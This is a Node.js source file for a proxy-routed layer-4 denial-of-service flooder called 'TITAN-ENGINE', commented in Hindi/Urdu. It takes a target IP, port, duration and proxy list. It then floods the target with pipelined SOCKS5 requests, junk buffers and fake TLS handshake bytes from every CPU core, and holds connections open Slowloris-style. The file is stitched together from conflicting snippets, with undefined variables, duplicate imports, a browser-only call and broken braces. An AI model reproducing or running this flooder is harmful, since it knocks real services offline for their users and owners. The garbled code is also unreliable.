const net = require("net");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

// CLOUDFLARE.js se uthaya gaya core optimization
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const target_ip = process.argv[2];
const target_port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (cluster.isMaster) {
    console.log(`\x1b[35m[TITAN-ENGINE]\x1b[0m 🔱 DEPLOYING ULTRA-L4 ENGINE`);
    console.log(`\x1b[36m[INFO]\x1b[0m TARGET: ${target_ip}:${target_port} | CORES: ${threads}`);

    for (let i = 0; i < threads; i++) cluster.fork();

    setTimeout(() => {
        console.log("\x1b[31m[!] ATTACK FINISHED\x1b[0m");
        process.exit();
    }, duration * 1000);
} else {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

    function attack() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        
        // Step 1: Net Socket setup with Bypass logic
        const net = require('net');

/**
 * Powerful Socket Launcher
 * Combines Kernel Buffering, TFO-style Pipelining, and Zero-Delay Logic
 */
const launchCombinedPower = (proxy, payloads) => {
    // 1. Socket Initialization with Hardware-Level Optimization
    const socket = net.connect({
        host: proxy[0],
        port: proxy[1],
        allowHalfOpen: true,     // Persistent connection management
        noDelay: true,           // Disable Nagle's Algorithm (Direct I/O)
        keepAlive: true,         // Re-use established TCP path
        keepAliveInitialDelay: 0 // Immediate probe for dead connections
    });

    // Manual overrides for extra enforcement
    socket.setNoDelay(true); 
    socket.setTimeout(10000);   // Aggressive timeout to recycle resources
    socket.unref();             // Frees event loop for higher PPS (Packets Per Second)

    socket.on('connect', () => {
        // 
        
        // 2. Optimized Data Burst (CORKING)
        // Isse multiple writes ko ek single Ethernet Frame (MTU) mein pack kiya jata hai
        socket.cork(); 
        
        try {
            payloads.forEach(payload => {
                if (socket.writable) {
                    socket.write(payload);
                }
            });
        } finally {
            // 3. Uncorking: Sab kuch ek massive TCP segment ban kar nikalega
            // Isse network overhead (Headers) kam aur actual data (Payload) zyada jata hai
            socket.uncork();
        }
    });

    // 4. Critical Cleanup (Zero Memory Leak)
    socket.on('error', () => socket.destroy());
    socket.on('timeout', () => socket.destroy());
    socket.on('end', () => socket.destroy());
};

// --- Execution Loop (The 100x Multiplier) ---
setInterval(() => {
    const myPayloads = [Buffer.from("DATA_1"), Buffer.from("DATA_2")]; 
    launchCombinedPower(["127.0.0.1", 8080], myPayloads);
}, 1);


        // 1. Pre-calculate buffers (Loop ke bahar taaki CPU load 0 rahe)
const GREETING = Buffer.from([0x05, 0x01, 0x00]);
const CONNECT_REQ = Buffer.concat([
    Buffer.from([0x05, 0x01, 0x00, 0x03, target_ip.length]),
    Buffer.from(target_ip),
    Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
]);

const launchPowerfulSocket = () => {
    const socket = net.connect({
        host: proxy_host,
        port: proxy_port,
        noDelay: true, // Nagle's algorithm disable: data turant nikalta hai
        keepAlive: true,
        keepAliveInitialDelay: 0
    });

    socket.on('connect', () => {
        // 
        
        // 2. CORKING: Sabse powerful feature. 
        // Ye packets ko OS level par batch karta hai taaki Network Interface Card (NIC) saturate ho sake.
        socket.cork(); 
        
        socket.write(GREETING);
        socket.write(CONNECT_REQ); // SOCKS5 protocol ka reply sune bina request bhej di (Pipelining)
        
        // Extra junk data to fill the TCP Window
        socket.write(Buffer.allocUnsafe(512)); 
        
        socket.uncork(); // Ek single massive MTU frame ban kar nikalega
    });

    // 3. Ultra-fast Cleanup
    socket.on('error', () => socket.destroy());
    socket.once('timeout', () => socket.destroy());
    socket.setTimeout(10000); // 10s aggressive timeout
};

// 4. Industrial Scaling (High-Speed Interval)
setInterval(() => {
    for(let i = 0; i < 20; i++) { // Ek hi cycle mein multiple connections
        launchPowerfulSocket();
    }
}, 1);


        const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const net = require('net');

if (cluster.isMaster) {
    const numCPUs = os.cpus().length;
    console.log(`[MASTER] Master process started. Spawning ${numCPUs} Workers...`);

    // Har CPU core ke liye ek worker create karein
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`[MASTER] Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork(); // Agar koi worker crash ho toh turant naya start karein
    });

} else {
    // --- WORKER PROCESS (Actual Attack Logic) ---
    const target_ip = "1.2.3.4"; // Aapka target
    const target_port = 443;

    // Pre-calculated Buffer (No CPU waste inside loop)
    const handshakePacket = Buffer.concat([
        Buffer.from([0x05, 0x01, 0x00, 0x03, target_ip.length]),
        Buffer.from(target_ip),
        Buffer.from([(target_port >> 8) & 0xff, target_port & 0xff])
    ]);

    const startAttack = () => {
        const socket = net.connect(target_port, target_ip, () => {
            socket.setNoDelay(true); // Fast delivery
            socket.setKeepAlive(true, 5000);
            
            // Blast sequence
            socket.cork();
            for(let i = 0; i < 50; i++) {
                socket.write(handshakePacket);
            }
            socket.uncork();
        });

        socket.on('data', (data) => {
            if (data[0] === 0x05) {
                socket.write(handshakePacket);
            }
        });

        socket.on('error', () => {
            socket.destroy(); // Error par resources release karein
        });

        // 2 minute baad connection reset
        setTimeout(() => socket.destroy(), 120000);
    };

    // Extreme Frequency Loop
    setInterval(startAttack, 1); 

    console.log(`[WORKER ${process.pid}] Attack thread active.`);
}


                // --- CLOUDFLARE.js "Infinite Pipelining" Logic ---
                // Ek bar connection bana toh bina rukaawat ke binary stream bhejenge
                // Ek bada 1MB ka pool pehle hi bhar lein
const bufferPool = crypto.randomBytes(1024 * 1024); 

const streamData = () => {
    if (!socket.writable) return;

    socket.cork(); // Kernel level par buffering enable karein
    for(let i = 0; i < 100; i++) {
        // Randomly slice karke data nikalna fast hota hai
        const start = Math.floor(Math.random() * (bufferPool.length - 1024));
        const size = Math.floor(Math.random() * 512) + 512;
        socket.write(bufferPool.slice(start, start + size));
    }
    process.nextTick(() => socket.uncork()); // Saara data ek saath flush karein
};

                        
                        // Fake Handshake Signatures (Mimicking TLS/SSH)
                        // Optimized: Direct Buffer concatenation
const payload = Buffer.concat([
    Buffer.from([0x16, 0x03, 0x01, 0x02, 0x00, 0x01, 0x00, 0x01, 0xfc, 0x03, 0x03]),
    crypto.randomBytes(32)
]);
socket.write(payload);
                    
                    // Zero-delay recursion (CLOUDFLARE.js style speed)
                    setImmediate(streamData);
                };
                streamData();
            }
        });

        socket.on('error', () => { socket.destroy(); });
        socket.on('timeout', () => { socket.destroy(); });
        
        // Slowloris touch: Connection ko 2 minute tak hold rakho
        setTimeout(() => {
    if (!socket.destroyed) {
        socket.end(); // Pehle data flush karega
        console.log("Socket closing gracefully...");
    }
}, 120000);

    // High Concurrency Loop: Har core par naye connections ka jaal
    function powerAttack() {
    attack();
    requestAnimationFrame(powerAttack);
}
powerAttack();
}
